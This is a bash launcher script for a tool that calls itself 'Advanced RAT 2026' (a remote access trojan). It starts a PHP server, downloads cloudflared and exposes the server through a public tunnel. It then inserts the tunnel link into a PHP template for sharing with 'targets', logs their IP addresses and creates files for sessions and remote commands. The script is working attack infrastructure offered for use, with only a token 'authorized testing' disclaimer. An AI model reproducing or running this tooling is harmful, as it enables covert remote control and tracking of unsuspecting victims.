#!/bin/bash
# Advanced RAT 2026 v2.0 - WORKING VERSION
# Created by Manjunath Yalam

trap 'printf "\n";stop' 2

banner() {
clear
echo -e "\033[38;5;51m"
cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════╗
    ║    █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗       ║
    ║   ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝       ║
    ║   ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║            ║
    ║   ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║            ║
    ║   ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗       ║
    ║   ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝       ║
    ║                                                               ║
    ║   ██████╗  █████╗ ████████╗    ██████╗  ██████╗ ██████╗    ║
    ║   ██╔══██╗██╔══██╗╚══██╔══╝    ╚════██╗██╔═████╗╚════██╗   ║
    ║   ██████╔╝███████║   ██║        █████╔╝██║██╔██║ █████╔╝   ║
    ║   ██╔══██╗██╔══██║   ██║       ██╔═══╝ ████╔╝██║██╔═══╝    ║
    ║   ██║  ██║██║  ██║   ██║       ███████╗╚██████╔╝███████╗   ║
    ║   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚══════╝ ╚═════╝ ╚══════╝   ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "\033[0m"
printf "\e[1;93m         Advanced RAT 2026 - Next-Gen Framework v2.0\e[0m\n"
printf "\e[1;92m         Created by Manjunath Yalam | 2026 Edition\e[0m\n"
printf "\e[1;96m         AI-Powered • Multi-Platform • Real-time\e[0m\n"
printf "\n"
printf "\e[1;91m⚠ FOR AUTHORIZED PENETRATION TESTING ONLY ⚠\e[0m\n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { 
    echo -e "\e[1;91m[!] PHP is required but not installed.\e[0m"
    echo -e "\e[1;93m[*] Install with: apt-get install php\e[0m"
    exit 1
}
}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)

if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
fi

printf "\e[1;92m[✓] All services stopped\e[0m\n"
exit 0
}

catch_ip() {
if [[ -e "ip.txt" ]]; then
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
printf "\e[1;93m[+] New Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
rm -f ip.txt
fi
}

setup_environment() {
printf "\e[1;96m[*] Setting up environment...\e[0m\n"

mkdir -p data/logs 2>/dev/null
mkdir -p data/sessions 2>/dev/null

touch data/rat_sessions.json
touch data/rat_commands.json
touch ip.txt
touch saved.ip.txt

echo '{"sessions":[]}' > data/rat_sessions.json
echo '{"commands":[]}' > data/rat_commands.json

printf "\e[1;92m[✓] Environment ready\e[0m\n"
}

monitor_targets() {
printf "\n"
printf "\e[1;92m[✓] RAT 2026 Server Running\e[0m\n"
printf "\e[1;93m[*] Control Panel:\e[0m\e[1;77m http://127.0.0.1:4444/admin2026.html\e[0m\n"
printf "\e[1;96m[*] Waiting for targets... Press Ctrl+C to stop\e[0m\n"
printf "\n"

while true; do
catch_ip
sleep 2
done 
}

install_cloudflared() {
if [[ -e cloudflared ]]; then
printf "\e[1;93m[*] Cloudflared already installed\e[0m\n"
return
fi

command -v wget > /dev/null 2>&1 || { 
    echo -e "\e[1;91m[!] wget required. Install: apt-get install wget\e[0m"
    exit 1
}

printf "\e[1;92m[+] Downloading Cloudflared...\e[0m\n"
arch=$(uname -m)

if [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'arm'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
fi

chmod +x cloudflared
printf "\e[1;92m[✓] Cloudflared ready\e[0m\n"
}

start_cloudflared() {
install_cloudflared

printf "\e[1;92m[+] Starting PHP server...\e[0m\n"
php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
sleep 2

printf "\e[1;92m[+] Starting Cloudflared tunnel...\e[0m\n"
rm -f cf.log
./cloudflared tunnel --url http://127.0.0.1:4444 --logfile cf.log > /dev/null 2>&1 &
sleep 12

link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")

if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Cloudflared failed. Using localhost.\e[0m\n"
start_localhost
return
fi

printf "\e[1;92m[✓] Tunnel established!\e[0m\n"
printf "\e[1;93m[*] Target Link:\e[0m\e[1;77m %s\e[0m\n" $link
printf "\e[1;96m[*] Share this link with authorized target\e[0m\n"

sed 's|TUNNEL_URL|'$link'|g' template2026.php > index.php

monitor_targets
}

start_localhost() {
printf "\e[1;92m[+] Starting PHP server on localhost:4444...\e[0m\n"
php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
sleep 2

printf "\e[1;92m[✓] Server running:\e[0m\e[1;77m http://127.0.0.1:4444\e[0m\n"

sed 's|TUNNEL_URL|http://127.0.0.1:4444|g' template2026.php > index.php

monitor_targets
}

main_menu() {
printf "\e[1;96m╔════════════════════════════════════════╗\e[0m\n"
printf "\e[1;96m║      SELECT DEPLOYMENT MODE           ║\e[0m\n"
printf "\e[1;96m╚════════════════════════════════════════╝\e[0m\n"
printf "\n"
printf "\e[1;92m[1] Cloudflared Tunnel (Public Access)\e[0m\n"
printf "\e[1;93m[2] Localhost Only (Local Network)\e[0m\n"
printf "\e[1;91m[3] Exit\e[0m\n"
printf "\n"
read -p $'\e[1;96m[?] Select option [1-3]: \e[0m' option

case $option in
    1)
        start_cloudflared
        ;;
    2)
        start_localhost
        ;;
    3)
        printf "\e[1;92m[✓] Goodbye!\e[0m\n"
        exit 0
        ;;
    *)
        printf "\e[1;91m[!] Invalid option\e[0m\n"
        sleep 1
        main_menu
        ;;
esac
}

banner
dependencies
setup_environment
main_menu